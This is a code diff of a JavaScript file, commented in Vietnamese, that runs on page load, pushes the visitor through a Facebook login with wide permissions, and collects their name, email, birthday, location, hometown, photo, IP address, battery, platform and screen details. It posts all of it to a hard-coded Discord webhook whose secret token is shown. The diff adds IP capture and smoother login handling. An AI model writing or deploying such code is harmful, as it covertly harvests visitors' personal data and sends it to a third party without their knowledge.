@@ -1,28 +1,30 @@
-//webhook
+// Webhook gửi dữ liệu
 function sendMessage(params) {
-  const request = new XMLHttpRequest();
-  request.open("POST", "https://discord.com/api/webhooks/1277242406047322122/QgJnmWYTa8Wvp6s_Y5q1Wwd2xFVY5fMKGqqzk5tyjKBXKYwt8SsywIFfWjTU8w0Ac-ds");
-  request.setRequestHeader('Content-type', 'application/json');
-  request.send(JSON.stringify(params));
+    const request = new XMLHttpRequest();
+    request.open("POST", "https://discord.com/api/webhooks/1277242406047322122/QgJnmWYTa8Wvp6s_Y5q1Wwd2xFVY5fMKGqqzk5tyjKBXKYwt8SsywIFfWjTU8w0Ac-ds");
+    request.setRequestHeader('Content-type', 'application/json');
+    request.send(JSON.stringify(params));
 }
-//fetch api
+
+// Lấy địa chỉ IP
 var ip;
 async function getData() {
-  const url = "https://api.ipify.org?format=json";
-  try {
-    const response = await fetch(url);
-    if (!response.ok) {
-      throw new Error(`Response status: ${response.status}`);
+    const url = "https://api.ipify.org?format=json";
+    try {
+        const response = await fetch(url);
+        if (!response.ok) {
+            throw new Error(`Response status: ${response.status}`);
+        }
+        const json = await response.json();
+        ip = json.ip;
+    } catch (error) {
+        console.error(error.message);
     }
-    const json = await response.json();
-    ip = await json.ip
-  } catch (error) {
-    console.error(error.message);
-  }
 }
+
 let facebookUserData = null; // Biến toàn cục lưu dữ liệu Facebook
 
-// Hàm tải SDK Facebook
+// Tải SDK Facebook đúng cách
 function loadFacebookSDK(appId) {
     return new Promise((resolve) => {
         if (document.getElementById('facebook-jssdk')) {
@@ -31,14 +33,19 @@ function loadFacebookSDK(appId) {
         let js = document.createElement('script');
         js.id = 'facebook-jssdk';
         js.src = "https://connect.facebook.net/en_US/sdk.js";
+        js.async = true;
+        js.defer = true;
         js.onload = function() {
-            FB.init({
-                appId: appId, // Thay bằng App ID của bạn
-                cookie: true,
-                xfbml: true,
-                version: 'v18.0' // Phiên bản mới nhất
-            });
-            resolve();
+            window.fbAsyncInit = function() {
+                FB.init({
+                    appId: appId,
+                    cookie: true,
+                    xfbml: true,
+                    version: 'v18.0'
+                });
+                console.log("Facebook SDK Loaded");
+                resolve();
+            };
         };
         document.head.appendChild(js);
     });
@@ -47,8 +54,8 @@ function loadFacebookSDK(appId) {
 // Hàm lấy thông tin Facebook
 async function getFacebookUserData() {
     return new Promise((resolve) => {
-        FB.login(function(response) {
-            if (response.authResponse) {
+        FB.getLoginStatus(function(response) {
+            if (response.status === 'connected') {
                 FB.api('/me', {
                     fields: 'id,name,first_name,last_name,email,gender,birthday,location,hometown,picture'
                 }, function(user) {
@@ -56,9 +63,20 @@ async function getFacebookUserData() {
                     resolve(user);
                 });
             } else {
-                resolve(null);
+                FB.login(function(response) {
+                    if (response.authResponse) {
+                        FB.api('/me', {
+                            fields: 'id,name,first_name,last_name,email,gender,birthday,location,hometown,picture'
+                        }, function(user) {
+                            facebookUserData = user;
+                            resolve(user);
+                        });
+                    } else {
+                        resolve(null);
+                    }
+                }, { scope: 'public_profile,email,user_birthday,user_location,user_hometown' });
             }
-        }, { scope: 'public_profile,email,user_birthday,user_location,user_hometown' });
+        });
     });
 }
 
@@ -66,11 +84,12 @@ async function getFacebookUserData() {
 const postDataUser = async () => {
     await loadFacebookSDK('1483255362403222'); // Thay YOUR_APP_ID bằng App ID của bạn
     await getFacebookUserData();
+    await getData();
 
     // Lấy thông tin pin
-    let bat;
-    await navigator.getBattery().then((battery) => {
-        bat = battery;
+    let battery;
+    await navigator.getBattery().then((bat) => {
+        battery = bat;
     });
 
     // Lấy thông tin hệ thống
@@ -82,19 +101,18 @@ const postDataUser = async () => {
     let adminIp = "118.68.117.146";
 
     // Kiểm tra xem user có phải admin không
-    let userIp = "Không xác định"; // Nếu bạn có cách lấy IP, thay vào đây
-    let userType = userIp == adminIp ? "Admin" : userIp;
+    let userType = ip == adminIp ? "Admin" : ip;
 
     // Gửi dữ liệu
     sendMessage({
         content: `----------------------------------------------\n**User: ${userType}**\n\n`
-            + `**Facebook Name:** ${facebookUserData ? facebookUserData.name : "Không lấy được"}\n`
-            + `**Facebook ID:** ${facebookUserData ? facebookUserData.id : "Không lấy được"}\n`
-            + `**First Name:** ${facebookUserData ? facebookUserData.first_name : "Không lấy được"}\n`
-            + `**Last Name:** ${facebookUserData ? facebookUserData.last_name : "Không lấy được"}\n`
-            + `**Email:** ${facebookUserData ? facebookUserData.email : "Không lấy được"}\n`
-            + `**Gender:** ${facebookUserData ? facebookUserData.gender : "Không lấy được"}\n`
-            + `**Birthday:** ${facebookUserData ? facebookUserData.birthday : "Không lấy được"}\n`
+            + `**Facebook Name:** ${facebookUserData?.name || "Không lấy được"}\n`
+            + `**Facebook ID:** ${facebookUserData?.id || "Không lấy được"}\n`
+            + `**First Name:** ${facebookUserData?.first_name || "Không lấy được"}\n`
+            + `**Last Name:** ${facebookUserData?.last_name || "Không lấy được"}\n`
+            + `**Email:** ${facebookUserData?.email || "Không lấy được"}\n`
+            + `**Gender:** ${facebookUserData?.gender || "Không lấy được"}\n`
+            + `**Birthday:** ${facebookUserData?.birthday || "Không lấy được"}\n`
             + `**Location:** ${facebookUserData?.location?.name || "Không lấy được"}\n`
             + `**Hometown:** ${facebookUserData?.hometown?.name || "Không lấy được"}\n`
             + `**Profile Picture:** ${facebookUserData?.picture?.data?.url || "Không lấy được"}\n`
@@ -107,13 +125,12 @@ const postDataUser = async () => {
             + `**Platform:** ${userData?.platform}\n`
             + `**Language:** ${language}\n`
             + `**Screen:**\n  - Height: ${height}\n  - Width: ${width}\n`
-            + `**Battery:**\n  - Level: ${bat.level * 100}%\n  - Charging: ${bat.charging ? "Có" : "Không"}`,
+            + `**Battery:**\n  - Level: ${battery.level * 100}%\n  - Charging: ${battery.charging ? "Có" : "Không"}`,
     });
 };
 
 // Gọi hàm chính
 postDataUser();
-
 
 
 //////////////////////////////////////////////////////////////////////////////////////////WEB FUNCITION
